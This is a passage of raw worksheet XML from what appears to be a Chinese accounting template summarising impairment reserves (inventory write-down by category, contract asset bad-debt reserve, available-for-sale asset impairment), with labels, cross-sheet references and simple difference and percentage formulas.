      <c r="AO15" s="389" t="n"/>
      <c r="AP15" s="389" t="n"/>
      <c r="AQ15" s="389" t="n"/>
      <c r="AR15" s="389" t="n"/>
      <c r="AS15" s="389" t="n"/>
      <c r="AT15" s="389" t="n"/>
      <c r="AU15" s="389" t="n"/>
      <c r="AV15" s="389" t="n"/>
      <c r="AW15" s="389" t="n"/>
      <c r="AX15" s="389" t="n"/>
      <c r="AY15" s="389" t="n"/>
      <c r="AZ15" s="389" t="n"/>
      <c r="BA15" s="389" t="n"/>
      <c r="BB15" s="389" t="n"/>
      <c r="BC15" s="389" t="n"/>
      <c r="BD15" s="389" t="n"/>
      <c r="BE15" s="389" t="n"/>
      <c r="BF15" s="389" t="n"/>
    </row>
    <row r="16" ht="15" customHeight="1" s="415">
      <c r="A16" s="284" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="B16" s="397" t="inlineStr">
        <is>
          <t>跌价存货委加</t>
        </is>
      </c>
      <c r="C16" s="182" t="inlineStr">
        <is>
          <t>跌价准备-委托加工物资</t>
        </is>
      </c>
      <c r="D16" s="629">
        <f>'3-9-4委托加工物资'!H27</f>
        <v/>
      </c>
      <c r="E16" s="629" t="n"/>
      <c r="F16" s="627">
        <f>IF((E16-D16)=0,"",(E16-D16))</f>
        <v/>
      </c>
      <c r="G16" s="627">
        <f>IF(OR(D16=0,D16="",F16=""),"",F16/D16*100)</f>
        <v/>
      </c>
      <c r="H16" s="628" t="n"/>
      <c r="I16" s="389" t="n"/>
      <c r="J16" s="389" t="n"/>
      <c r="K16" s="389" t="n"/>
      <c r="L16" s="389" t="n"/>
      <c r="M16" s="389" t="n"/>
      <c r="N16" s="389" t="n"/>
      <c r="O16" s="389" t="n"/>
      <c r="P16" s="389" t="n"/>
      <c r="Q16" s="389" t="n"/>
      <c r="R16" s="389" t="n"/>
      <c r="S16" s="389" t="n"/>
      <c r="T16" s="389" t="n"/>
      <c r="U16" s="389" t="n"/>
      <c r="V16" s="389" t="n"/>
      <c r="W16" s="389" t="n"/>
      <c r="X16" s="389" t="n"/>
      <c r="Y16" s="389" t="n"/>
      <c r="Z16" s="389" t="n"/>
      <c r="AA16" s="389" t="n"/>
      <c r="AB16" s="389" t="n"/>
      <c r="AC16" s="389" t="n"/>
      <c r="AD16" s="389" t="n"/>
      <c r="AE16" s="389" t="n"/>
      <c r="AF16" s="389" t="n"/>
      <c r="AG16" s="389" t="n"/>
      <c r="AH16" s="389" t="n"/>
      <c r="AI16" s="389" t="n"/>
      <c r="AJ16" s="389" t="n"/>
      <c r="AK16" s="389" t="n"/>
      <c r="AL16" s="389" t="n"/>
      <c r="AM16" s="389" t="n"/>
      <c r="AN16" s="389" t="n"/>
      <c r="AO16" s="389" t="n"/>
      <c r="AP16" s="389" t="n"/>
      <c r="AQ16" s="389" t="n"/>
      <c r="AR16" s="389" t="n"/>
      <c r="AS16" s="389" t="n"/>
      <c r="AT16" s="389" t="n"/>
      <c r="AU16" s="389" t="n"/>
      <c r="AV16" s="389" t="n"/>
      <c r="AW16" s="389" t="n"/>
      <c r="AX16" s="389" t="n"/>
      <c r="AY16" s="389" t="n"/>
      <c r="AZ16" s="389" t="n"/>
      <c r="BA16" s="389" t="n"/>
      <c r="BB16" s="389" t="n"/>
      <c r="BC16" s="389" t="n"/>
      <c r="BD16" s="389" t="n"/>
      <c r="BE16" s="389" t="n"/>
      <c r="BF16" s="389" t="n"/>
    </row>
    <row r="17" ht="15" customHeight="1" s="415">
      <c r="A17" s="284" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="B17" s="397" t="inlineStr">
        <is>
          <t>跌价存货产成</t>
        </is>
      </c>
      <c r="C17" s="182" t="inlineStr">
        <is>
          <t>跌价准备-产成品（库存商品）</t>
        </is>
      </c>
      <c r="D17" s="629">
        <f>'3-9-5产成品（库存商品）'!H27</f>
        <v/>
      </c>
      <c r="E17" s="629" t="n"/>
      <c r="F17" s="627">
        <f>IF((E17-D17)=0,"",(E17-D17))</f>
        <v/>
      </c>
      <c r="G17" s="627">
        <f>IF(OR(D17=0,D17="",F17=""),"",F17/D17*100)</f>
        <v/>
      </c>
      <c r="H17" s="628" t="n"/>
      <c r="I17" s="389" t="n"/>
      <c r="J17" s="389" t="n"/>
      <c r="K17" s="389" t="n"/>
      <c r="L17" s="389" t="n"/>
      <c r="M17" s="389" t="n"/>
      <c r="N17" s="389" t="n"/>
      <c r="O17" s="389" t="n"/>
      <c r="P17" s="389" t="n"/>
      <c r="Q17" s="389" t="n"/>
      <c r="R17" s="389" t="n"/>
      <c r="S17" s="389" t="n"/>
      <c r="T17" s="389" t="n"/>
      <c r="U17" s="389" t="n"/>
      <c r="V17" s="389" t="n"/>
      <c r="W17" s="389" t="n"/>
      <c r="X17" s="389" t="n"/>
      <c r="Y17" s="389" t="n"/>
      <c r="Z17" s="389" t="n"/>
      <c r="AA17" s="389" t="n"/>
      <c r="AB17" s="389" t="n"/>
      <c r="AC17" s="389" t="n"/>
      <c r="AD17" s="389" t="n"/>
      <c r="AE17" s="389" t="n"/>
      <c r="AF17" s="389" t="n"/>
      <c r="AG17" s="389" t="n"/>
      <c r="AH17" s="389" t="n"/>
      <c r="AI17" s="389" t="n"/>
      <c r="AJ17" s="389" t="n"/>
      <c r="AK17" s="389" t="n"/>
      <c r="AL17" s="389" t="n"/>
      <c r="AM17" s="389" t="n"/>
      <c r="AN17" s="389" t="n"/>
      <c r="AO17" s="389" t="n"/>
      <c r="AP17" s="389" t="n"/>
      <c r="AQ17" s="389" t="n"/>
      <c r="AR17" s="389" t="n"/>
      <c r="AS17" s="389" t="n"/>
      <c r="AT17" s="389" t="n"/>
      <c r="AU17" s="389" t="n"/>
      <c r="AV17" s="389" t="n"/>
      <c r="AW17" s="389" t="n"/>
      <c r="AX17" s="389" t="n"/>
      <c r="AY17" s="389" t="n"/>
      <c r="AZ17" s="389" t="n"/>
      <c r="BA17" s="389" t="n"/>
      <c r="BB17" s="389" t="n"/>
      <c r="BC17" s="389" t="n"/>
      <c r="BD17" s="389" t="n"/>
      <c r="BE17" s="389" t="n"/>
      <c r="BF17" s="389" t="n"/>
    </row>
    <row r="18" ht="15" customHeight="1" s="415">
      <c r="A18" s="284" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="B18" s="397" t="inlineStr">
        <is>
          <t>跌价存货在产</t>
        </is>
      </c>
      <c r="C18" s="182" t="inlineStr">
        <is>
          <t>跌价准备-在产品（自制半成品）</t>
        </is>
      </c>
      <c r="D18" s="629">
        <f>'3-9-6在产品（自制半成品）'!H27</f>
        <v/>
      </c>
      <c r="E18" s="629" t="n"/>
      <c r="F18" s="627">
        <f>IF((E18-D18)=0,"",(E18-D18))</f>
        <v/>
      </c>
      <c r="G18" s="627">
        <f>IF(OR(D18=0,D18="",F18=""),"",F18/D18*100)</f>
        <v/>
      </c>
      <c r="H18" s="628" t="n"/>
      <c r="I18" s="389" t="n"/>
      <c r="J18" s="389" t="n"/>
      <c r="K18" s="389" t="n"/>
      <c r="L18" s="389" t="n"/>
      <c r="M18" s="389" t="n"/>
      <c r="N18" s="389" t="n"/>
      <c r="O18" s="389" t="n"/>
      <c r="P18" s="389" t="n"/>
      <c r="Q18" s="389" t="n"/>
      <c r="R18" s="389" t="n"/>
      <c r="S18" s="389" t="n"/>
      <c r="T18" s="389" t="n"/>
      <c r="U18" s="389" t="n"/>
      <c r="V18" s="389" t="n"/>
      <c r="W18" s="389" t="n"/>
      <c r="X18" s="389" t="n"/>
      <c r="Y18" s="389" t="n"/>
      <c r="Z18" s="389" t="n"/>
      <c r="AA18" s="389" t="n"/>
      <c r="AB18" s="389" t="n"/>
      <c r="AC18" s="389" t="n"/>
      <c r="AD18" s="389" t="n"/>
      <c r="AE18" s="389" t="n"/>
      <c r="AF18" s="389" t="n"/>
      <c r="AG18" s="389" t="n"/>
      <c r="AH18" s="389" t="n"/>
      <c r="AI18" s="389" t="n"/>
      <c r="AJ18" s="389" t="n"/>
      <c r="AK18" s="389" t="n"/>
      <c r="AL18" s="389" t="n"/>
      <c r="AM18" s="389" t="n"/>
      <c r="AN18" s="389" t="n"/>
      <c r="AO18" s="389" t="n"/>
      <c r="AP18" s="389" t="n"/>
      <c r="AQ18" s="389" t="n"/>
      <c r="AR18" s="389" t="n"/>
      <c r="AS18" s="389" t="n"/>
      <c r="AT18" s="389" t="n"/>
      <c r="AU18" s="389" t="n"/>
      <c r="AV18" s="389" t="n"/>
      <c r="AW18" s="389" t="n"/>
      <c r="AX18" s="389" t="n"/>
      <c r="AY18" s="389" t="n"/>
      <c r="AZ18" s="389" t="n"/>
      <c r="BA18" s="389" t="n"/>
      <c r="BB18" s="389" t="n"/>
      <c r="BC18" s="389" t="n"/>
      <c r="BD18" s="389" t="n"/>
      <c r="BE18" s="389" t="n"/>
      <c r="BF18" s="389" t="n"/>
    </row>
    <row r="19" ht="15" customHeight="1" s="415">
      <c r="A19" s="284" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="B19" s="397" t="inlineStr">
        <is>
          <t>跌价存货发出</t>
        </is>
      </c>
      <c r="C19" s="182" t="inlineStr">
        <is>
          <t>跌价准备-发出商品</t>
        </is>
      </c>
      <c r="D19" s="629">
        <f>'3-9-7发出商品'!H27</f>
        <v/>
      </c>
      <c r="E19" s="629" t="n"/>
      <c r="F19" s="627">
        <f>IF((E19-D19)=0,"",(E19-D19))</f>
        <v/>
      </c>
      <c r="G19" s="627">
        <f>IF(OR(D19=0,D19="",F19=""),"",F19/D19*100)</f>
        <v/>
      </c>
      <c r="H19" s="628" t="n"/>
      <c r="I19" s="389" t="n"/>
      <c r="J19" s="389" t="n"/>
      <c r="K19" s="389" t="n"/>
      <c r="L19" s="389" t="n"/>
      <c r="M19" s="389" t="n"/>
      <c r="N19" s="389" t="n"/>
      <c r="O19" s="389" t="n"/>
      <c r="P19" s="389" t="n"/>
      <c r="Q19" s="389" t="n"/>
      <c r="R19" s="389" t="n"/>
      <c r="S19" s="389" t="n"/>
      <c r="T19" s="389" t="n"/>
      <c r="U19" s="389" t="n"/>
      <c r="V19" s="389" t="n"/>
      <c r="W19" s="389" t="n"/>
      <c r="X19" s="389" t="n"/>
      <c r="Y19" s="389" t="n"/>
      <c r="Z19" s="389" t="n"/>
      <c r="AA19" s="389" t="n"/>
      <c r="AB19" s="389" t="n"/>
      <c r="AC19" s="389" t="n"/>
      <c r="AD19" s="389" t="n"/>
      <c r="AE19" s="389" t="n"/>
      <c r="AF19" s="389" t="n"/>
      <c r="AG19" s="389" t="n"/>
      <c r="AH19" s="389" t="n"/>
      <c r="AI19" s="389" t="n"/>
      <c r="AJ19" s="389" t="n"/>
      <c r="AK19" s="389" t="n"/>
      <c r="AL19" s="389" t="n"/>
      <c r="AM19" s="389" t="n"/>
      <c r="AN19" s="389" t="n"/>
      <c r="AO19" s="389" t="n"/>
      <c r="AP19" s="389" t="n"/>
      <c r="AQ19" s="389" t="n"/>
      <c r="AR19" s="389" t="n"/>
      <c r="AS19" s="389" t="n"/>
      <c r="AT19" s="389" t="n"/>
      <c r="AU19" s="389" t="n"/>
      <c r="AV19" s="389" t="n"/>
      <c r="AW19" s="389" t="n"/>
      <c r="AX19" s="389" t="n"/>
      <c r="AY19" s="389" t="n"/>
      <c r="AZ19" s="389" t="n"/>
      <c r="BA19" s="389" t="n"/>
      <c r="BB19" s="389" t="n"/>
      <c r="BC19" s="389" t="n"/>
      <c r="BD19" s="389" t="n"/>
      <c r="BE19" s="389" t="n"/>
      <c r="BF19" s="389" t="n"/>
    </row>
    <row r="20" ht="15" customHeight="1" s="415">
      <c r="A20" s="284" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="B20" s="397" t="inlineStr">
        <is>
          <t>跌价存货在用</t>
        </is>
      </c>
      <c r="C20" s="182" t="inlineStr">
        <is>
          <t>跌价准备-在用周转材料</t>
        </is>
      </c>
      <c r="D20" s="629">
        <f>'3-9-8在用周转材料'!H27</f>
        <v/>
      </c>
      <c r="E20" s="629" t="n"/>
      <c r="F20" s="627">
        <f>IF((E20-D20)=0,"",(E20-D20))</f>
        <v/>
      </c>
      <c r="G20" s="627">
        <f>IF(OR(D20=0,D20="",F20=""),"",F20/D20*100)</f>
        <v/>
      </c>
      <c r="H20" s="628" t="n"/>
      <c r="I20" s="389" t="n"/>
      <c r="J20" s="389" t="n"/>
      <c r="K20" s="389" t="n"/>
      <c r="L20" s="389" t="n"/>
      <c r="M20" s="389" t="n"/>
      <c r="N20" s="389" t="n"/>
      <c r="O20" s="389" t="n"/>
      <c r="P20" s="389" t="n"/>
      <c r="Q20" s="389" t="n"/>
      <c r="R20" s="389" t="n"/>
      <c r="S20" s="389" t="n"/>
      <c r="T20" s="389" t="n"/>
      <c r="U20" s="389" t="n"/>
      <c r="V20" s="389" t="n"/>
      <c r="W20" s="389" t="n"/>
      <c r="X20" s="389" t="n"/>
      <c r="Y20" s="389" t="n"/>
      <c r="Z20" s="389" t="n"/>
      <c r="AA20" s="389" t="n"/>
      <c r="AB20" s="389" t="n"/>
      <c r="AC20" s="389" t="n"/>
      <c r="AD20" s="389" t="n"/>
      <c r="AE20" s="389" t="n"/>
      <c r="AF20" s="389" t="n"/>
      <c r="AG20" s="389" t="n"/>
      <c r="AH20" s="389" t="n"/>
      <c r="AI20" s="389" t="n"/>
      <c r="AJ20" s="389" t="n"/>
      <c r="AK20" s="389" t="n"/>
      <c r="AL20" s="389" t="n"/>
      <c r="AM20" s="389" t="n"/>
      <c r="AN20" s="389" t="n"/>
      <c r="AO20" s="389" t="n"/>
      <c r="AP20" s="389" t="n"/>
      <c r="AQ20" s="389" t="n"/>
      <c r="AR20" s="389" t="n"/>
      <c r="AS20" s="389" t="n"/>
      <c r="AT20" s="389" t="n"/>
      <c r="AU20" s="389" t="n"/>
      <c r="AV20" s="389" t="n"/>
      <c r="AW20" s="389" t="n"/>
      <c r="AX20" s="389" t="n"/>
      <c r="AY20" s="389" t="n"/>
      <c r="AZ20" s="389" t="n"/>
      <c r="BA20" s="389" t="n"/>
      <c r="BB20" s="389" t="n"/>
      <c r="BC20" s="389" t="n"/>
      <c r="BD20" s="389" t="n"/>
      <c r="BE20" s="389" t="n"/>
      <c r="BF20" s="389" t="n"/>
    </row>
    <row r="21" ht="15" customHeight="1" s="415">
      <c r="A21" s="284" t="inlineStr">
        <is>
          <t>3-9-9</t>
        </is>
      </c>
      <c r="B21" s="91" t="inlineStr">
        <is>
          <t>跌价存货履约</t>
        </is>
      </c>
      <c r="C21" s="157" t="inlineStr">
        <is>
          <t>跌价准备-合同履约成本</t>
        </is>
      </c>
      <c r="D21" s="629">
        <f>'3-9-9合同履约成本'!E27</f>
        <v/>
      </c>
      <c r="E21" s="629" t="n"/>
      <c r="F21" s="627">
        <f>IF((E21-D21)=0,"",(E21-D21))</f>
        <v/>
      </c>
      <c r="G21" s="627">
        <f>IF(OR(D21=0,D21="",F21=""),"",F21/D21*100)</f>
        <v/>
      </c>
      <c r="H21" s="628" t="n"/>
      <c r="I21" s="389" t="n"/>
      <c r="J21" s="389" t="n"/>
      <c r="K21" s="389" t="n"/>
      <c r="L21" s="389" t="n"/>
      <c r="M21" s="389" t="n"/>
      <c r="N21" s="389" t="n"/>
      <c r="O21" s="389" t="n"/>
      <c r="P21" s="389" t="n"/>
      <c r="Q21" s="389" t="n"/>
      <c r="R21" s="389" t="n"/>
      <c r="S21" s="389" t="n"/>
      <c r="T21" s="389" t="n"/>
      <c r="U21" s="389" t="n"/>
      <c r="V21" s="389" t="n"/>
      <c r="W21" s="389" t="n"/>
      <c r="X21" s="389" t="n"/>
      <c r="Y21" s="389" t="n"/>
      <c r="Z21" s="389" t="n"/>
      <c r="AA21" s="389" t="n"/>
      <c r="AB21" s="389" t="n"/>
      <c r="AC21" s="389" t="n"/>
      <c r="AD21" s="389" t="n"/>
      <c r="AE21" s="389" t="n"/>
      <c r="AF21" s="389" t="n"/>
      <c r="AG21" s="389" t="n"/>
      <c r="AH21" s="389" t="n"/>
      <c r="AI21" s="389" t="n"/>
      <c r="AJ21" s="389" t="n"/>
      <c r="AK21" s="389" t="n"/>
      <c r="AL21" s="389" t="n"/>
      <c r="AM21" s="389" t="n"/>
      <c r="AN21" s="389" t="n"/>
      <c r="AO21" s="389" t="n"/>
      <c r="AP21" s="389" t="n"/>
      <c r="AQ21" s="389" t="n"/>
      <c r="AR21" s="389" t="n"/>
      <c r="AS21" s="389" t="n"/>
      <c r="AT21" s="389" t="n"/>
      <c r="AU21" s="389" t="n"/>
      <c r="AV21" s="389" t="n"/>
      <c r="AW21" s="389" t="n"/>
      <c r="AX21" s="389" t="n"/>
      <c r="AY21" s="389" t="n"/>
      <c r="AZ21" s="389" t="n"/>
      <c r="BA21" s="389" t="n"/>
      <c r="BB21" s="389" t="n"/>
      <c r="BC21" s="389" t="n"/>
      <c r="BD21" s="389" t="n"/>
      <c r="BE21" s="389" t="n"/>
      <c r="BF21" s="389" t="n"/>
    </row>
    <row r="22" ht="15" customHeight="1" s="415">
      <c r="A22" s="284" t="n"/>
      <c r="B22" s="91" t="n"/>
      <c r="C22" s="157" t="n"/>
      <c r="D22" s="629" t="n"/>
      <c r="E22" s="629" t="n"/>
      <c r="F22" s="627">
        <f>IF((E22-D22)=0,"",(E22-D22))</f>
        <v/>
      </c>
      <c r="G22" s="627">
        <f>IF(OR(D22=0,D22="",F22=""),"",F22/D22*100)</f>
        <v/>
      </c>
      <c r="H22" s="628" t="n"/>
      <c r="I22" s="389" t="n"/>
      <c r="J22" s="389" t="n"/>
      <c r="K22" s="389" t="n"/>
      <c r="L22" s="389" t="n"/>
      <c r="M22" s="389" t="n"/>
      <c r="N22" s="389" t="n"/>
      <c r="O22" s="389" t="n"/>
      <c r="P22" s="389" t="n"/>
      <c r="Q22" s="389" t="n"/>
      <c r="R22" s="389" t="n"/>
      <c r="S22" s="389" t="n"/>
      <c r="T22" s="389" t="n"/>
      <c r="U22" s="389" t="n"/>
      <c r="V22" s="389" t="n"/>
      <c r="W22" s="389" t="n"/>
      <c r="X22" s="389" t="n"/>
      <c r="Y22" s="389" t="n"/>
      <c r="Z22" s="389" t="n"/>
      <c r="AA22" s="389" t="n"/>
      <c r="AB22" s="389" t="n"/>
      <c r="AC22" s="389" t="n"/>
      <c r="AD22" s="389" t="n"/>
      <c r="AE22" s="389" t="n"/>
      <c r="AF22" s="389" t="n"/>
      <c r="AG22" s="389" t="n"/>
      <c r="AH22" s="389" t="n"/>
      <c r="AI22" s="389" t="n"/>
      <c r="AJ22" s="389" t="n"/>
      <c r="AK22" s="389" t="n"/>
      <c r="AL22" s="389" t="n"/>
      <c r="AM22" s="389" t="n"/>
      <c r="AN22" s="389" t="n"/>
      <c r="AO22" s="389" t="n"/>
      <c r="AP22" s="389" t="n"/>
      <c r="AQ22" s="389" t="n"/>
      <c r="AR22" s="389" t="n"/>
      <c r="AS22" s="389" t="n"/>
      <c r="AT22" s="389" t="n"/>
      <c r="AU22" s="389" t="n"/>
      <c r="AV22" s="389" t="n"/>
      <c r="AW22" s="389" t="n"/>
      <c r="AX22" s="389" t="n"/>
      <c r="AY22" s="389" t="n"/>
      <c r="AZ22" s="389" t="n"/>
      <c r="BA22" s="389" t="n"/>
      <c r="BB22" s="389" t="n"/>
      <c r="BC22" s="389" t="n"/>
      <c r="BD22" s="389" t="n"/>
      <c r="BE22" s="389" t="n"/>
      <c r="BF22" s="389" t="n"/>
    </row>
    <row r="23" ht="15" customHeight="1" s="415">
      <c r="A23" s="284" t="inlineStr">
        <is>
          <t>3-10</t>
        </is>
      </c>
      <c r="B23" s="96" t="inlineStr">
        <is>
          <t>合同坏账</t>
        </is>
      </c>
      <c r="C23" s="97" t="inlineStr">
        <is>
          <t>合同资产坏账准备</t>
        </is>
      </c>
      <c r="D23" s="590">
        <f>'3-10合同资产'!F27</f>
        <v/>
      </c>
      <c r="E23" s="590">
        <f>'3-10合同资产'!G27</f>
        <v/>
      </c>
      <c r="F23" s="627">
        <f>IF((E23-D23)=0,"",(E23-D23))</f>
        <v/>
      </c>
      <c r="G23" s="627">
        <f>IF(OR(D23=0,D23="",F23=""),"",F23/D23*100)</f>
        <v/>
      </c>
      <c r="H23" s="628" t="n"/>
      <c r="I23" s="389" t="n"/>
      <c r="J23" s="389" t="n"/>
      <c r="K23" s="389" t="n"/>
      <c r="L23" s="389" t="n"/>
      <c r="M23" s="389" t="n"/>
      <c r="N23" s="389" t="n"/>
      <c r="O23" s="389" t="n"/>
      <c r="P23" s="389" t="n"/>
      <c r="Q23" s="389" t="n"/>
      <c r="R23" s="389" t="n"/>
      <c r="S23" s="389" t="n"/>
      <c r="T23" s="389" t="n"/>
      <c r="U23" s="389" t="n"/>
      <c r="V23" s="389" t="n"/>
      <c r="W23" s="389" t="n"/>
      <c r="X23" s="389" t="n"/>
      <c r="Y23" s="389" t="n"/>
      <c r="Z23" s="389" t="n"/>
      <c r="AA23" s="389" t="n"/>
      <c r="AB23" s="389" t="n"/>
      <c r="AC23" s="389" t="n"/>
      <c r="AD23" s="389" t="n"/>
      <c r="AE23" s="389" t="n"/>
      <c r="AF23" s="389" t="n"/>
      <c r="AG23" s="389" t="n"/>
      <c r="AH23" s="389" t="n"/>
      <c r="AI23" s="389" t="n"/>
      <c r="AJ23" s="389" t="n"/>
      <c r="AK23" s="389" t="n"/>
      <c r="AL23" s="389" t="n"/>
      <c r="AM23" s="389" t="n"/>
      <c r="AN23" s="389" t="n"/>
      <c r="AO23" s="389" t="n"/>
      <c r="AP23" s="389" t="n"/>
      <c r="AQ23" s="389" t="n"/>
      <c r="AR23" s="389" t="n"/>
      <c r="AS23" s="389" t="n"/>
      <c r="AT23" s="389" t="n"/>
      <c r="AU23" s="389" t="n"/>
      <c r="AV23" s="389" t="n"/>
      <c r="AW23" s="389" t="n"/>
      <c r="AX23" s="389" t="n"/>
      <c r="AY23" s="389" t="n"/>
      <c r="AZ23" s="389" t="n"/>
      <c r="BA23" s="389" t="n"/>
      <c r="BB23" s="389" t="n"/>
      <c r="BC23" s="389" t="n"/>
      <c r="BD23" s="389" t="n"/>
      <c r="BE23" s="389" t="n"/>
      <c r="BF23" s="389" t="n"/>
    </row>
    <row r="24" ht="15" customHeight="1" s="415">
      <c r="A24" s="55" t="n"/>
      <c r="B24" s="185" t="inlineStr">
        <is>
          <t>可售汇总</t>
        </is>
      </c>
      <c r="C24" s="180" t="inlineStr">
        <is>
          <t>三、可供出售金融资产减值准备合计</t>
        </is>
      </c>
      <c r="D24" s="627">
        <f>SUM(D25:D27)</f>
        <v/>
      </c>
      <c r="E24" s="627">
        <f>SUM(E25:E27)</f>
        <v/>
      </c>
      <c r="F24" s="627">
        <f>IF((E24-D24)=0,"",(E24-D24))</f>
        <v/>
      </c>
      <c r="G24" s="627">
        <f>IF(OR(D24=0,D24="",F24=""),"",F24/D24*100)</f>
        <v/>
      </c>
      <c r="H24" s="628" t="n"/>
      <c r="I24" s="389" t="n"/>
      <c r="J24" s="389" t="n"/>
      <c r="K24" s="389" t="n"/>
      <c r="L24" s="389" t="n"/>
      <c r="M24" s="389" t="n"/>
      <c r="N24" s="389" t="n"/>
      <c r="O24" s="389" t="n"/>
      <c r="P24" s="389" t="n"/>
      <c r="Q24" s="389" t="n"/>
      <c r="R24" s="389" t="n"/>
      <c r="S24" s="389" t="n"/>
      <c r="T24" s="389" t="n"/>
      <c r="U24" s="389" t="n"/>
      <c r="V24" s="389" t="n"/>
      <c r="W24" s="389" t="n"/>
      <c r="X24" s="389" t="n"/>
      <c r="Y24" s="389" t="n"/>
      <c r="Z24" s="389" t="n"/>
      <c r="AA24" s="389" t="n"/>
      <c r="AB24" s="389" t="n"/>
      <c r="AC24" s="389" t="n"/>
      <c r="AD24" s="389" t="n"/>
      <c r="AE24" s="389" t="n"/>
      <c r="AF24" s="389" t="n"/>
      <c r="AG24" s="389" t="n"/>
      <c r="AH24" s="389" t="n"/>
      <c r="AI24" s="389" t="n"/>
      <c r="AJ24" s="389" t="n"/>
      <c r="AK24" s="389" t="n"/>
      <c r="AL24" s="389" t="n"/>
      <c r="AM24" s="389" t="n"/>
      <c r="AN24" s="389" t="n"/>
      <c r="AO24" s="389" t="n"/>
      <c r="AP24" s="389" t="n"/>
      <c r="AQ24" s="389" t="n"/>
      <c r="AR24" s="389" t="n"/>
      <c r="AS24" s="389" t="n"/>
      <c r="AT24" s="389" t="n"/>
      <c r="AU24" s="389" t="n"/>
      <c r="AV24" s="389" t="n"/>
      <c r="AW24" s="389" t="n"/>
      <c r="AX24" s="389" t="n"/>
      <c r="AY24" s="389" t="n"/>
      <c r="AZ24" s="389" t="n"/>
      <c r="BA24" s="389" t="n"/>
      <c r="BB24" s="389" t="n"/>
      <c r="BC24" s="389" t="n"/>
      <c r="BD24" s="389" t="n"/>
      <c r="BE24" s="389" t="n"/>
      <c r="BF24" s="389" t="n"/>
    </row>
    <row r="25" ht="15" customHeight="1" s="415">
      <c r="A25" s="55" t="n"/>
      <c r="B25" s="185" t="inlineStr">
        <is>
          <t>可售股票</t>
        </is>
      </c>
      <c r="C25" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中：可供出售股票</t>
        </is>
      </c>
      <c r="D25" s="631" t="n"/>
      <c r="E25" s="631" t="n"/>
      <c r="F25" s="627">
        <f>IF((E25-D25)=0,"",(E25-D25))</f>
        <v/>
      </c>
      <c r="G25" s="627">
        <f>IF(OR(D25=0,D25="",F25=""),"",F25/D25*100)</f>
        <v/>
      </c>
      <c r="H25" s="628" t="n"/>
      <c r="I25" s="389" t="n"/>
      <c r="J25" s="389" t="n"/>
      <c r="K25" s="389" t="n"/>
      <c r="L25" s="389" t="n"/>
      <c r="M25" s="389" t="n"/>
      <c r="N25" s="389" t="n"/>
      <c r="O25" s="389" t="n"/>
      <c r="P25" s="389" t="n"/>
      <c r="Q25" s="389" t="n"/>
      <c r="R25" s="389" t="n"/>
      <c r="S25" s="389" t="n"/>
      <c r="T25" s="389" t="n"/>
      <c r="U25" s="389" t="n"/>
      <c r="V25" s="389" t="n"/>
      <c r="W25" s="389" t="n"/>
      <c r="X25" s="389" t="n"/>
      <c r="Y25" s="389" t="n"/>
      <c r="Z25" s="389" t="n"/>
      <c r="AA25" s="389" t="n"/>
      <c r="AB25" s="389" t="n"/>
      <c r="AC25" s="389" t="n"/>
      <c r="AD25" s="389" t="n"/>
      <c r="AE25" s="389" t="n"/>
      <c r="AF25" s="389" t="n"/>
      <c r="AG25" s="389" t="n"/>
      <c r="AH25" s="389" t="n"/>
      <c r="AI25" s="389" t="n"/>
      <c r="AJ25" s="389" t="n"/>
      <c r="AK25" s="389" t="n"/>
      <c r="AL25" s="389" t="n"/>
      <c r="AM25" s="389" t="n"/>
      <c r="AN25" s="389" t="n"/>
      <c r="AO25" s="389" t="n"/>
      <c r="AP25" s="389" t="n"/>
      <c r="AQ25" s="389" t="n"/>
      <c r="AR25" s="389" t="n"/>
      <c r="AS25" s="389" t="n"/>
      <c r="AT25" s="389" t="n"/>
      <c r="AU25" s="389" t="n"/>
      <c r="AV25" s="389" t="n"/>
      <c r="AW25" s="389" t="n"/>
      <c r="AX25" s="389" t="n"/>
      <c r="AY25" s="389" t="n"/>
      <c r="AZ25" s="389" t="n"/>
      <c r="BA25" s="389" t="n"/>
      <c r="BB25" s="389" t="n"/>
      <c r="BC25" s="389" t="n"/>
      <c r="BD25" s="389" t="n"/>
      <c r="BE25" s="389" t="n"/>
      <c r="BF25" s="389" t="n"/>
    </row>
    <row r="26" ht="15" customHeight="1" s="415">
      <c r="A26" s="55" t="n"/>
      <c r="B26" s="185" t="inlineStr">
        <is>
          <t>可售债券</t>
        </is>
      </c>
      <c r="C26" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         可供出售债券</t>
        </is>
      </c>
      <c r="D26" s="631" t="n"/>
      <c r="E26" s="631" t="n"/>
      <c r="F26" s="627">
        <f>IF((E26-D26)=0,"",(E26-D26))</f>
        <v/>
      </c>
      <c r="G26" s="627">
        <f>IF(OR(D26=0,D26="",F26=""),"",F26/D26*100)</f>
        <v/>
      </c>
      <c r="H26" s="628" t="n"/>
      <c r="I26" s="389" t="n"/>
      <c r="J26" s="389" t="n"/>
      <c r="K26" s="389" t="n"/>
      <c r="L26" s="389" t="n"/>
      <c r="M26" s="389" t="n"/>
      <c r="N26" s="389" t="n"/>
      <c r="O26" s="389" t="n"/>
      <c r="P26" s="389" t="n"/>
      <c r="Q26" s="389" t="n"/>
      <c r="R26" s="389" t="n"/>
      <c r="S26" s="389" t="n"/>
      <c r="T26" s="389" t="n"/>
      <c r="U26" s="389" t="n"/>
      <c r="V26" s="389" t="n"/>
      <c r="W26" s="389" t="n"/>
      <c r="X26" s="389" t="n"/>
      <c r="Y26" s="389" t="n"/>
      <c r="Z26" s="389" t="n"/>
      <c r="AA26" s="389" t="n"/>
      <c r="AB26" s="389" t="n"/>
      <c r="AC26" s="389" t="n"/>
      <c r="AD26" s="389" t="n"/>
      <c r="AE26" s="389" t="n"/>
      <c r="AF26" s="389" t="n"/>
      <c r="AG26" s="389" t="n"/>
      <c r="AH26" s="389" t="n"/>
      <c r="AI26" s="389" t="n"/>
      <c r="AJ26" s="389" t="n"/>
      <c r="AK26" s="389" t="n"/>
      <c r="AL26" s="389" t="n"/>
      <c r="AM26" s="389" t="n"/>
      <c r="AN26" s="389" t="n"/>
      <c r="AO26" s="389" t="n"/>
      <c r="AP26" s="389" t="n"/>
      <c r="AQ26" s="389" t="n"/>
      <c r="AR26" s="389" t="n"/>
      <c r="AS26" s="389" t="n"/>
